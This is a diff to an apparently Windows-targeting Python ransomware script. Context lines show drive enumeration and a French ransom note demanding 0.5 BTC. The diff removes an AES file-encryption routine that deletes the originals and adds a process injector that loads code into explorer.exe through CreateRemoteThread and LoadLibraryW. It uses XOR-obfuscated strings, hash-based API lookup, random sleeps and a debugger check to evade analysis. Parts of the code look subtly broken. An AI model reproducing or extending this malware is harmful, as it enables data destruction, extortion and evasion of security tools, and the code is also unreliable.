@@ -1,9 +1,12 @@
+import ctypes
 import os
-import string
+import sys
+import time
+import random
+import hashlib
+from ctypes import wintypes
 from pathlib import Path
-from cryptography.hazmat.primitives import padding
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
+import string
 import multiprocessing
 import winreg
 import subprocess
@@ -12,6 +15,7 @@ import time
 import random
 import base64
 import psutil
+
 
 vbs_template = r'''On Error Resume Next
 Set WshShell = CreateObject("WScript.Shell")
@@ -205,27 +209,6 @@ def get_existing_root_path():
             root_paths.append(drive)
     return root_paths
 
-def encrypte_file(input_file):
-    backend = default_backend()
-    iv = os.urandom(16)
-    with open(input_file, 'rb') as f:
-        data = f.read()
-
-    padder = padding.PKCS7(128).padder()
-    padded_data = padder.update(data) + padder.finalize()
-
-    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
-    encryptor = cipher.encryptor()
-    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
-
-    output_file = input_file + ".locked"
-
-    with open(output_file, 'wb') as f:
-        f.write(iv + encrypted_data)
-
-    os.remove(input_file)
-    print(f"Fichier chiffré : {input_file}")
-    return True
 
 def worker(queue):
     while True:
@@ -300,6 +283,208 @@ Veuillez envoyer 0.5 BTC à l'adresse XXXXXXXX pour obtenir la clé."""
         except:
             continue
 
+#------------
+def find_explorer_pid():
+    """Find explorer.exe PID with fallback methods"""
+    print("\n=== PROCESS FINDER ===")
+    
+    # Random sleep to evade timing analysis
+    time.sleep(random.uniform(0.5, 1.5))
+    
+    # Method 1: Try psutil first
+    try:
+        import psutil
+        print("[+] Using psutil to find explorer.exe")
+        for proc in psutil.process_iter(['pid', 'name']):
+            if proc.info['name'].lower() == 'explorer.exe':
+                pid = proc.info['pid']
+                print(f"[+] Found explorer.exe (PID: {pid}) using psutil")
+                return pid
+    except ImportError:
+        print("[!] psutil not available, using ctypes fallback")
+
+def xor_decrypt(data, key):
+    """Decrypt XOR-encrypted bytes back to string"""
+    decrypted = bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])
+    return decrypted.decode('utf-8')
+
+def xor_encrypt(data, key):
+    """Encrypt string data using XOR with key"""
+    data_bytes = data.encode('utf-8')  # Convert string to bytes first
+    return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data_bytes)])
+KEY = "x0rK3y"
+DEFAULT_DLL_PATH = xor_encrypt(r"/home/mehdi/Desktop/ransomware/migrationv2.py", KEY)
+OBF_KERNEL32 = xor_encrypt("kernel32.dll", KEY)
+OBF_ENCRYPTION_TARGET = xor_encrypt("ENCRYPTION_TARGET", KEY)
+
+def hash_string(s):
+    return int(hashlib.md5(s.encode()).hexdigest()[:8], 16)
+
+class DllInjector:
+    def __init__(self, dll_path):
+        self.dll_path = os.path.abspath(xor_decrypt(dll_path, KEY))
+        self._setup_functions()
+
+    def _setup_functions(self):
+        """Initialize Windows API functions with obfuscated names"""
+        self.kernel32 = ctypes.WinDLL(xor_decrypt(OBF_KERNEL32, KEY), use_last_error=True)
+        
+        # Configure function prototypes
+        self.OpenProcess = self.kernel32.OpenProcess
+        self.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+        self.OpenProcess.restype = wintypes.HANDLE
+        
+        self.VirtualAllocEx = self.kernel32.VirtualAllocEx
+        self.VirtualAllocEx.argtypes = [
+            wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD
+        ]
+        self.VirtualAllocEx.restype = wintypes.LPVOID
+        
+        self.WriteProcessMemory = self.kernel32.WriteProcessMemory
+        self.WriteProcessMemory.argtypes = [
+            wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
+        ]
+        self.WriteProcessMemory.restype = wintypes.BOOL
+        
+        self.GetModuleHandle = self.kernel32.GetModuleHandleW
+        self.GetModuleHandle.argtypes = [wintypes.LPCWSTR]
+        self.GetModuleHandle.restype = wintypes.HMODULE
+        
+        self.GetProcAddress = self.kernel32.GetProcAddress
+        self.GetProcAddress.argtypes = [wintypes.HMODULE, ctypes.c_char_p]
+        self.GetProcAddress.restype = wintypes.LPVOID
+        
+        self.CreateRemoteThread = self.kernel32.CreateRemoteThread
+        self.CreateRemoteThread.argtypes = [
+            wintypes.HANDLE, ctypes.POINTER(ctypes.c_ulong), ctypes.c_size_t, wintypes.LPVOID,
+            wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)
+        ]
+        self.CreateRemoteThread.restype = wintypes.HANDLE
+        
+        self.CloseHandle = self.kernel32.CloseHandle
+        self.CloseHandle.argtypes = [wintypes.HANDLE]
+        self.CloseHandle.restype = wintypes.BOOL
+
+    def inject(self, pid, target_dir=None):
+        """Enhanced injection with detailed debugging"""
+        print("\n=== INJECTION DEBUGGING ===")
+        
+        # Random sleep to evade timing analysis
+        time.sleep(random.uniform(0.5, 2.5))
+        
+        # 1. Verify DLL exists
+        if not os.path.exists(self.dll_path):
+            print(f"[!] DLL not found at: {self.dll_path}")
+            return False
+        print(f"[+] DLL verified: {self.dll_path}")
+        
+        # 2. Set environment variable
+        if target_dir:
+            target_dir = os.path.abspath(target_dir)
+            os.environ[xor_decrypt(OBF_ENCRYPTION_TARGET, KEY)] = target_dir
+            print(f"[+] Set {xor_decrypt(OBF_ENCRYPTION_TARGET, KEY)}={target_dir}")
+            
+            # Verify target directory
+            if not os.path.exists(target_dir):
+                print(f"[!] Target directory does not exist: {target_dir}")
+                return False
+            print(f"[+] Target directory verified")
+        
+        # 3. Open target process
+        PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
+        process = self.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+        if not process:
+            error = ctypes.get_last_error()
+            print(f"[!] Failed to open process (PID: {pid}, Error: {error})")
+            return False
+        print(f"[+] Process opened successfully (PID: {pid})")
+        
+        try:
+            # 4. Allocate memory in target process
+            mem_size = (len(self.dll_path) + 1) * 2  # Unicode string size
+            dll_path_remote = self.VirtualAllocEx(
+                process, 
+                None,
+                mem_size,
+                0x3000,  # MEM_COMMIT | MEM_RESERVE
+                0x40     # PAGE_EXECUTE_READWRITE
+            )
+            
+            if not dll_path_remote:
+                error = ctypes.get_last_error()
+                print(f"[!] Memory allocation failed (Error: {error})")
+                return False
+            print(f"[+] Allocated {mem_size} bytes at {hex(dll_path_remote)}")
+            
+            # 5. Write DLL path to target process
+            written = ctypes.c_size_t(0)
+            dll_path_encoded = self.dll_path.encode('utf-16le') + b'\x00\x00'
+            if not self.WriteProcessMemory(
+                process,
+                dll_path_remote,
+                dll_path_encoded,
+                len(dll_path_encoded),
+                ctypes.byref(written)
+            ):
+                error = ctypes.get_last_error()
+                print(f"[!] Memory write failed (Error: {error})")
+                return False
+            print(f"[+] Wrote DLL path to target process ({written.value} bytes)")
+            
+            # 6. Get LoadLibraryW address using hash-based lookup
+            kernel32_hash = hash_string("kernel32.dll")
+            loadlib_hash = hash_string("kernel32.dll!LoadLibraryW")
+            
+            kernel32_handle = self.GetModuleHandle(ctypes.create_unicode_buffer(xor_decrypt(OBF_KERNEL32, KEY)))
+            if not kernel32_handle:
+                error = ctypes.get_last_error()
+                print(f"[!] Failed to get kernel32 handle (Error: {error})")
+                return False
+            print("[+] Found kernel32.dll")
+            
+            # Use hash to get function address
+            func_map = {
+                hash_string("kernel32.dll!LoadLibraryW"): b"LoadLibraryW"
+            }
+            
+            load_library = self.GetProcAddress(kernel32_handle, func_map[loadlib_hash])
+            if not load_library:
+                error = ctypes.get_last_error()
+                print(f"[!] Failed to get LoadLibraryW address (Error: {error})")
+                return False
+            print(f"[+] Found LoadLibraryW at {hex(load_library)}")
+            
+            # 7. Create remote thread
+            thread = self.CreateRemoteThread(
+                process,
+                None,
+                0,
+                load_library,
+                dll_path_remote,
+                0,
+                None
+            )
+            
+            if not thread:
+                error = ctypes.get_last_error()
+                print(f"[!] Thread creation failed (Error: {error})")
+                return False
+            print(f"[+] Created remote thread ({thread})")
+            
+            # 8. Wait for completion
+            WAIT_TIMEOUT = 0x00000102
+            result = self.kernel32.WaitForSingleObject(thread, 10000)  # 10 second timeout
+            if result == WAIT_TIMEOUT:
+                print("[!] Thread execution timed out")
+            else:
+                print("[+] Thread executed successfully")
+            
+            self.CloseHandle(thread)
+            return True
+            
+        finally:
+            self.CloseHandle(process)
+#------------------
 def main():
     time.sleep(random.uniform(5, 15))
     existDir = os.path.dirname(os.path.abspath(__file__))
@@ -311,7 +496,15 @@ def main():
     if ctypes.windll.kernel32.IsDebuggerPresent():
         print("[!] Debugger detected - exiting")
         sys.exit(1)
+
     default_dll = xor_decrypt(DEFAULT_DLL_PATH, KEY)
+
+    pid = find_explorer_pid()
+    if not pid:
+        print("❌ Could not find explorer.exe process")
+        sys.exit(1)
+
+    injector = DllInjector(DEFAULT_DLL_PATH)
 
     lecteurs = get_existing_root_path()
     max_workers = 30
